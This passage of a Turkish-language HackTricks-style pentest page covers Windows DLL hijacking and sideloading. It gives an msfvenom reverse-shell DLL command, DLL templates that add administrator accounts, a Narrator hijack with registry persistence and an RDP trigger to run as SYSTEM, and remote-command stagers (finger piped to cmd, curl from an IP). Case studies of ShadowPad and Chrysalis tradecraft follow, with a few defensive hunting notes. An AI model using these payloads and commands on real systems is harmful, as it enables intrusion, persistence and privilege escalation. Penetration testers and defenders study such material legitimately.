msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir kullanıcı oluşturun (x64 sürümünü göremedim, x86):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Kendi DLL'iniz

Birçok durumda derlediğiniz DLL, **victim process tarafından içe aktarılan her işlevi export etmelidir**. Gerekli bir export eksikse, binary bu işlevi çözümlenemez ve exploit başarısız olur.

<details>
<summary>C DLL şablonu (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Kullanıcı oluşturma içeren C++ DLL örneği</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternatif C DLL'i, thread giriş noktasıyla</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Vaka İncelemesi: Narrator OneCore TTS Localization DLL Hijack (Erişilebilirlik/AT'ler)

Windows Narrator.exe, başlangıçta hâlâ tahmin edilebilir, dile özgü bir localization DLL dosyasını arar; bu dosya, keyfi kod yürütme ve persistence için hijack edilebilir.<sup>[[7]](#references)</sup>

Temel bilgiler
- Probe path (güncel sürümler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Eski path (daha eski sürümler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore path'te saldırganın kontrolündeki yazılabilir bir DLL varsa yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` yürütülür. Export gerekmez.

Procmon ile keşif
- Filtre: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki path'e yönelik yükleme girişimini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC sessizliği
- Naif bir hijack, UI'da ses çıkarır/vurgu yapar. Sessiz kalmak için attach sırasında Narrator thread'lerini listeleyin, ana thread'i (`OpenThread(THREAD_SUSPEND_RESUME)`) açıp `SuspendThread` ile askıya alın; kendi thread'inizde devam edin. Tam kod için PoC'ye bakın.<sup>[[8]](#references)</sup>

Accessibility yapılandırması üzerinden tetikleme ve kalıcılık
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle Narrator başlatıldığında yerleştirilen DLL yüklenir. Güvenli masaüstünde (oturum açma ekranında), Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.

RDP ile tetiklenen SYSTEM çalıştırması (yatay hareket)
- Klasik RDP güvenlik katmanını etkinleştirin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Ana makineye RDP ile bağlanın ve oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
- RDP oturumu kapandığında çalıştırma durur; vakit kaybetmeden inject/migrate edin.

Kendi Accessibility aracınızı getirin (BYOA)
- Yerleşik bir Accessibility Tool (AT) kayıt defteri girdisini (ör. CursorIndicator) kopyalayabilir, girdiyi rastgele bir binary/DLL'e işaret edecek şekilde düzenleyip içe aktarabilir, ardından `configuration` değerini bu AT'nin adına ayarlayabilirsiniz. Bu, Accessibility framework'ü altında rastgele kod çalıştırılmasını sağlar.

Notlar
- `%windir%\System32` dizinine yazmak ve HKLM değerlerini değiştirmek için yönetici hakları gerekir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde yer alabilir; export gerekmez.

## Vaka Çalışması: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme

Bu örnek, Lenovo'nun TrackPoint Quick Menu (`TPQMAssistant.exe`) uygulamasındaki **Phantom DLL Hijacking** tekniğini gösterir; bu açık **CVE-2025-1729** olarak izlenmektedir.<sup>[[2]](#references)[[3]](#references)</sup>

### Güvenlik Açığı Ayrıntıları

- **Bileşen**: `C:\ProgramData\Lenovo\TPQM\Assistant\` konumundaki `TPQMAssistant.exe`.
- **Zamanlanmış Görev**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, her gün 9:30'da oturum açmış kullanıcının bağlamında çalışır.
- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir; bu, yerel kullanıcıların rastgele dosyalar bırakmasına olanak tanır.
- **DLL Arama Davranışı**: Önce çalışma dizininden `hostfxr.dll` yüklemeye çalışır ve dosya yoksa "NAME NOT FOUND" kaydeder; bu, yerel dizin arama önceliğine işaret eder.

### Exploit Uygulaması

Bir saldırgan, eksik DLL'den yararlanarak kullanıcının bağlamında kod çalıştırmak için aynı dizine kötü amaçlı bir `hostfxr.dll` taslağı yerleştirebilir:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Saldırı Akışı

1. Standart kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin, geçerli kullanıcının bağlamında saat 9:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturum açmışsa, kötü amaçlı DLL yöneticinin oturumunda medium integrity düzeyinde çalışır.
4. Medium integrity düzeyinden SYSTEM ayrıcalıklarına yükseltmek için standart UAC bypass tekniklerini zincirleyin.

## Vaka Çalışması: MSI CustomAction Dropper + İmzalı Host (wsc_proxy.exe) Üzerinden DLL Side-Loading

Tehdit aktörleri, yükleri güvenilir ve imzalı bir süreç altında çalıştırmak için MSI tabanlı dropper'ları sıklıkla DLL side-loading ile eşleştirir.<sup>[[10]](#references)</sup>

Zincire genel bakış
- Kullanıcı MSI dosyasını indirir. GUI kurulumu sırasında bir CustomAction sessizce çalışır (ör. LaunchApplication veya bir VBScript eylemi) ve sonraki aşamayı gömülü kaynaklardan yeniden oluşturur.
- Dropper, meşru ve imzalı bir EXE ile kötü amaçlı bir DLL'yi aynı dizine yazar (örnek eşleşme: Avast imzalı wsc_proxy.exe + saldırganın kontrolündeki wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL arama sırası önce çalışma dizinindeki wsc.dll dosyasını yükler ve saldırgan kodunu imzalı bir üst süreç altında çalıştırır (ATT&CK T1574.001).

MSI analizi (nelere bakılmalı)
- CustomAction tablosu:
  - Yürütülebilir dosyaları veya VBScript'i çalıştıran girdileri arayın. Şüpheli bir örüntü: arka planda gömülü bir dosyayı çalıştıran LaunchApplication.
  - Orca'da (Microsoft Orca.exe) CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/bölünmüş yükler:
  - Yönetimsel çıkarma: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ya da lessmsi kullanın: lessmsi x package.msi C:\out
  - VBScript CustomAction tarafından birleştirilip şifresi çözülen birden fazla küçük parça olup olmadığını inceleyin. Yaygın akış:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

wsc_proxy.exe ile pratik sideloading
- Bu iki dosyayı aynı klasöre koyun:
  - wsc_proxy.exe: meşru, imzalı host (Avast). İşlem, wsc.dll dosyasını kendi dizininden ada göre yüklemeye çalışır.
  - wsc.dll: saldırgan DLL'i. Belirli export'lar gerekmiyorsa DllMain yeterli olabilir; aksi takdirde bir proxy DLL oluşturun ve payload'ı DllMain içinde çalıştırırken gerekli export'ları gerçek kütüphaneye yönlendirin.
- Minimal bir DLL payload'ı oluşturun:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export gereksinimleri için, payload'ınızı da çalıştıran bir forwarding DLL oluşturmak üzere bir proxying framework (ör. DLLirant/Spartacus) kullanın.

- Bu teknik, host binary'nin DLL adını çözümlemesine dayanır. Host absolute path kullanıyorsa veya güvenli yükleme bayrakları (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) ayarlanmışsa hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded export'lar öncelik sırasını etkileyebilir; host binary'yi ve export setini seçerken bunları göz önünde bulundurun.

## İmzalı triad'lar + şifreli payload'lar (ShadowPad vaka incelemesi)

Check Point, Ink Dragon'ın ShadowPad'i, diskteki çekirdek payload'ı şifreli tutarken meşru yazılımlara benzemek için **üç dosyalı bir triad** kullanarak dağıttığını anlattı:<sup>[[12]](#references)</sup>

1. **İmzalı host EXE** – AMD, Realtek veya NVIDIA gibi üreticilerin dosyaları kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar, Authenticode imzası geçerliliğini korurken yürütülebilir dosyayı Windows binary'si gibi görünecek şekilde yeniden adlandırır (ör. `conhost.exe`).
2. **Kötü amaçlı loader DLL** – EXE'nin yanına, beklenen adla bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework'üyle obfuscate edilmiş bir MFC binary'sidir; tek görevi şifreli blob'u bulmak, şifresini çözmek ve ShadowPad'i reflectively map etmektir.
3. **Şifreli payload blob'u** – genellikle aynı dizinde `<name>.tmp` olarak saklanır. Şifresi çözülmüş payload'ı belleğe map ettikten sonra loader, adli kanıtları yok etmek için TMP dosyasını siler.

Tradecraft notları:

* İmzalı EXE'yi yeniden adlandırmak (PE header'daki özgün `OriginalFileName` değerini korurken), üretici imzasını muhafaza ederek Windows binary'si gibi görünmesini sağlar. Bu nedenle, Ink Dragon'ın gerçekten AMD/NVIDIA yardımcı programları olan `conhost.exe` görünümlü binary'ler bırakma alışkanlığını taklit edin.
* Yürütülebilir dosya güvenilir kaldığından, çoğu allowlisting denetiminde kötü amaçlı DLL'nizin yanına yerleştirilmesi yeterlidir. Loader DLL'yi özelleştirmeye odaklanın; imzalı üst süreç genellikle olduğu gibi çalıştırılabilir.
* ShadowPad'in decryptor'ı, TMP blob'un loader'ın yanında bulunmasını ve belleğe map ettikten sonra dosyayı sıfırlayabilmek için yazılabilir olmasını bekler. Payload yüklenene kadar dizini yazılabilir tutun; belleğe alındıktan sonra OPSEC için TMP dosyası güvenle silinebilir.

### LOLBAS stager + aşamalı arşiv sideloading zinciri (finger → tar/curl → WMI)

Operatörler, diskteki tek özel artifact'in güvenilir EXE'nin yanında duran kötü amaçlı DLL olması için DLL sideloading'i LOLBAS ile birlikte kullanır:<sup>[[1]](#references)</sup>

- **Uzaktan komut loader'ı (Finger):** Gizli PowerShell, `cmd.exe /c` işlemini başlatır, komutları bir Finger sunucusundan alır ve `cmd`'ye aktarır:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host`, TCP/79 üzerinden metin çeker; `| cmd` sunucu yanıtını çalıştırır ve operatörlerin second stage’i sunucu tarafında değiştirmesine olanak tanır.

- **Yerleşik indirme/çıkarma:** Zararsız bir uzantıya sahip arşivi indirin, açın ve sideload hedefini DLL ile birlikte rastgele bir `%LocalAppData%` klasörüne yerleştirin:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ilerleme bilgisini gizler ve yönlendirmeleri izler; `tar -xf`, Windows'un yerleşik tar aracını kullanır.

- **WMI/CIM launch:** Yanındaki DLL'yi yüklerken telemetride CIM tarafından oluşturulmuş bir işlem olarak görünmesi için EXE'yi WMI üzerinden başlatın:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Yerel DLL'leri tercih eden binary'lerle çalışır (örn. `intelbq.exe`, `nearby_share.exe`); payload (örn. Remcos), güvenilir ad altında çalışır.

- **Avlama:** `/p`, `/m` ve `/c` seçenekleri birlikte göründüğünde `forfiles` için uyarı oluşturun; yönetici script'leri dışında nadiren görülür.


## Vaka İncelemesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom saldırısı, NSIS ile paketlenmiş bir dropper dağıtmak için güvenilir bir güncelleme zincirini kötüye kullandı. Dropper, bir DLL sideload ve tamamen bellekte çalışan payload'ları hazırladı.<sup>[[13]](#references)</sup>

Tradecraft akışı
- `update.exe` (NSIS), `%AppData%\Bluetooth` dizinini oluşturur, **HIDDEN** olarak işaretler, yeniden adlandırılmış bir Bitdefender Submission Wizard `BluetoothService.exe` dosyasını, kötü amaçlı bir `log.dll` dosyasını ve şifrelenmiş bir `BluetoothService` blob'unu bırakır; ardından EXE'yi başlatır.
- Ana makine EXE'si `log.dll` dosyasını import eder ve `LogInit`/`LogWrite` işlevlerini çağırır. `LogInit` blob'u mmap ile yükler; `LogWrite` bunu özel bir LCG tabanlı akışla (sabitler **0x19660D** / **0x3C6EF35F**, anahtar materyali önceki bir hash'ten türetilir) çözer, arabelleğin üzerine düz metin shellcode yazar, geçici verileri serbest bırakır ve shellcode'a atlar.
- IAT kullanmamak için loader, dışa aktarılan adları **FNV-1a basis 0x811C9DC5 + prime 0x1000193** ile hash'ler, ardından Murmur tarzı bir avalanche (**0x85EBCA6B**) uygular ve sonuçları salt eklenmiş hedef hash'lerle karşılaştırır.

Ana shellcode (Chrysalis)
- Ana modüle benzeyen bir PE'yi `gQ2JR&9;` anahtarıyla beş geçiş boyunca tekrarlanan add/XOR/sub işlemleriyle çözer, ardından import çözümlemesini tamamlamak için `Kernel32.dll` → `GetProcAddress` dinamik olarak yükler.
- DLL ad dizelerini karakter başına bit-rotate/XOR dönüşümleriyle çalışma zamanında yeniden oluşturur, ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- **PEB → InMemoryOrderModuleList** üzerinde dolaşan, her export tablosunu Murmur tarzı karıştırma ile 4 baytlık bloklar halinde ayrıştıran ikinci bir resolver kullanır ve yalnızca hash bulunamazsa `GetProcAddress` işlevine geri döner.

Gömülü yapılandırma ve C2
- Yapılandırma, bırakılan `BluetoothService` dosyasının içinde **0x30808** konumunda (boyut **0x980**) bulunur ve C2 URL'sini ve User-Agent'ı ortaya çıkarmak için `qwhvb^435h&*7` anahtarıyla RC4 kullanılarak çözülür.
- Beacon'lar noktayla ayrılmış bir host profili oluşturur, başına `4Q` etiketi ekler ve HTTPS üzerinden `HttpSendRequestA` çağrısından önce `vAuig34%^325hGV` anahtarıyla RC4 kullanarak şifreler. Yanıtların şifresi RC4 ile çözülür ve bir etiket switch'iyle işlenir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + parçalı aktarım durumları).
- Çalıştırma modu CLI argümanlarına bağlıdır: argüman yoksa `-i` seçeneğini gösteren service/Run key persistence kurulur; `-i` kendisini `-k` ile yeniden başlatır; `-k` kurulumu atlar ve payload'ı çalıştırır.

Gözlemlenen alternatif loader
- Aynı saldırı Tiny C Compiler'ı bırakıp `C:\ProgramData\USOShared\` dizininden `svchost.exe -nostdlib -run conf.c` komutunu, yanındaki `libtcc.dll` ile çalıştırdı. Saldırganın sağladığı C kaynak kodu shellcode içeriyordu; derlendi ve bellekte çalıştırıldı, diske PE yazılmadı. Şununla tekrarlayın:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Bu TCC tabanlı derleme ve çalıştırma aşaması, çalışma zamanında `Wininet.dll` dosyasını içe aktardı ve sabit kodlanmış bir URL'den ikinci aşama shellcode'unu aldı; böylece derleyici çalıştırması gibi görünen esnek bir loader sağladı.

## İmzalı ana makineyle sideloading: export proxying + ana makine iş parçacığını bekletme

Bazı DLL sideloading zincirleri, kötü amaçlı DLL yüklendikten sonra çökmesini önlemek ve sonraki aşamaların sorunsuz yüklenmesine yetecek kadar meşru ana makineyi çalışır durumda tutmak için **kararlılık mühendisliği** ekler.<sup>[[11]](#references)</sup>

Gözlemlenen örüntü
- Güvenilir bir EXE'yi, beklenen bağımlılık adıyla (ör. `version.dll`) birlikte kötü amaçlı bir DLL'nin yanına bırakın.
- Kötü amaçlı DLL, içe aktarma çözümlemesinin başarılı olması ve ana makine sürecinin çalışmaya devam etmesi için beklenen tüm export'ları gerçek sistem DLL'sine (ör. `%SystemRoot%\\System32\\version.dll`) **proxy eder**.
- Yüklendikten sonra kötü amaçlı DLL, ana iş parçacığının çıkmak veya süreci sonlandıracak kod yollarını çalıştırmak yerine sonsuz bir `Sleep` döngüsüne girmesi için ana makinenin giriş noktasını **yamalar**.
- Gerçek kötü amaçlı işi yeni bir iş parçacığı yapar: sonraki aşama DLL'sinin adını veya yolunu (RC4/XOR yaygındır) şifresini çözer, ardından `LoadLibrary` ile başlatır.

Önemi
- Normal DLL proxying, API uyumluluğunu korur; ancak sonraki aşamalar için ana makinenin yeterince uzun süre çalışır durumda kalacağını garanti etmez.
- Ana iş parçacığını `Sleep(INFINITE)` içinde bekletmek, loader bir worker thread'de şifre çözme, hazırlama veya ağ önyüklemesi yaparken imzalı süreci bellekte tutmanın basit bir yoludur.
- Yalnızca şüpheli bir `DllMain` aramak, ilginç davranış ana makinenin giriş noktası yamalandıktan ve ikincil bir iş parçacığı başlatıldıktan sonra gerçekleşiyorsa bu örüntüyü gözden kaçırabilir.

Asgari iş akışı
1. İmzalı ana makine EXE'sini kopyalayın ve yerel dizinden hangi DLL'yi yüklediğini belirleyin.
2. Aynı işlevleri export edip bunları meşru DLL'ye yönlendiren bir proxy DLL oluşturun.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluşturun.
4. Bu iş parçacığından, `Sleep` çağrısıyla döngüye girmesi için ana makinenin giriş noktasını veya ana iş parçacığının başlangıç rutinini yamalayın.
5. Sonraki aşama DLL'sinin adını/yapılandırmasını şifresini çözerek `LoadLibrary` çağırın veya payload'u manual-map yöntemiyle belleğe yükleyin.

Savunma açısından inceleme noktaları
- `version.dll` veya benzer yaygın kitaplıkları `System32` yerine kendi uygulama dizinlerinden yükleyen imzalı süreçler.
- Görüntü yüklendikten kısa süre sonra süreç giriş noktasında yapılan bellek yamaları; özellikle `Sleep`/`SleepEx`'e yönlendirilen jump/call talimatları.
- Bir proxy DLL tarafından oluşturulan ve şifresi çözülmüş bir adla ikinci bir DLL üzerinde hemen `LoadLibrary` çağıran iş parçacıkları.
- `ProgramData`, `%TEMP%` veya çıkarılmış arşiv yolları gibi yazılabilir hazırlama dizinlerinde, üretici yürütülebilir dosyalarının yanına yerleştirilen tüm export'ları proxy eden DLL'ler.

## References

- [1] [Red Canary – İstihbarat Öngörüleri: Ocak 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Ayrıcalık Yükseltme](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows'ta DLL hijacking. Basit bir C örneği.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Avrupa'yı Hedef Alan Yeni Kötü Amaçlı Yazılımlar Dağıtıyor](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack'leri Windows Yardımcılarıyla Buluştuğunda](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Dijital İkizler: Gh0st RAT Dağıtan Gelişen Kimliğe Bürünme Kampanyalarının Anatomisi](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Kesişen Çıkarlar: Güneydoğu Asya'daki Bir Hükümeti Hedef Alan Tehdit Kümelerinin Analizi](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon'ın İç Yüzü: Gizli Bir Saldırı Operasyonunun Aktarma Ağını ve İşleyişini Ortaya Çıkarmak](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom'ın araç setine derinlemesine bir bakış](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack zinciri](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – İranlı APT Screening Serpens'in 2026 Casusluk Kampanyalarını Takip Etmek](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Hızlı ve Öfkeli: İran Çatışması Sırasında Nimbus Manticore Operasyonları](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Görev Eylemleri](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Güneydoğu Asya Hükümetlerini ve Kritik Altyapıyı Hedef Alıyor](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
